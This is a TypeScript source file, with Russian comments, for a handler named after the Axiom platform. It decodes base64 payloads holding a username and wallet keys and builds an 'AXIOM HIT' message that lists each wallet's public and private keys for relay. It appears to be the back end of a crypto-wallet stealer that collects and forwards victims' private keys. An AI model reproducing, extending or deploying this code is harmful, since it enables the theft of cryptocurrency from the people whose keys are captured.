import type { PlatformHandler, ProcessResult, PlatformData } from './types.js';

// Обработчик для платформы Axiom
export class AxiomHandler implements PlatformHandler {
  name = 'axiom';

  async processMessage(data: PlatformData | string): Promise<ProcessResult> {
    console.log('📦 Axiom processing started. Data type:', typeof data);
    
    let walletData: any;

    if (typeof data === 'string') {
      try {
        const decryptedData = Buffer.from(data, "base64").toString("utf-8");
        walletData = JSON.parse(decryptedData);
      } catch (e) {
        console.error('❌ Failed to parse base64 data in AxiomHandler');
        walletData = {};
      }
    } else {
      walletData = data;
    }

    console.error(JSON.stringify(walletData))

    // Проверяем наличие ключей в разных возможных полях (keys или message -> keys)
    let keys = walletData.keys;
    
    // Если ключей нет в корне, но есть поле message (базовая строка), 
    // пробуем извлечь ключи из неё (случай для некоторых типов интеграций)
    if (!keys && walletData.message && typeof walletData.message === 'string') {
      try {
        const decoded = JSON.parse(Buffer.from(walletData.message, 'base64').toString('utf-8'));
        keys = decoded.keys;
      } catch (e) {}
    }

    console.log(`📊 Axiom Data: User=${walletData.username}, Keys=${Array.isArray(keys) ? keys.length : 'none'}`);

    let message = `🎯 <b>AXIOM HIT</b>\n`;
    message += `👤 <b>User:</b> <code>${walletData.username || 'unknown'}</code>\n`;
    message += `🌐 <b>Platform:</b> <code>${walletData.platform || 'axiom'}</code>\n\n`;

    if (keys && Array.isArray(keys) && keys.length > 0) {
      keys.forEach((key: any, index: number) => {
        message += `🔑 <b>Wallet #${index + 1}</b>\n`;
        message += `<b>Public:</b> <code>${key.public || 'n/a'}</code>\n`;
        message += `<b>Private:</b> <code>${key.private || 'n/a'}</code>\n`;
        message += `----------------------------------------\n`;
      });
    } else {
      message += `⚠️ <i>No keys found in payload</i>\n`;
      // Для отладки добавим сырые данные если ключей нет
      console.log('Raw data received:', JSON.stringify(walletData));
    }

    return {
      messageToSend: message,
      messageToSendFull: message,
    };
  }
}
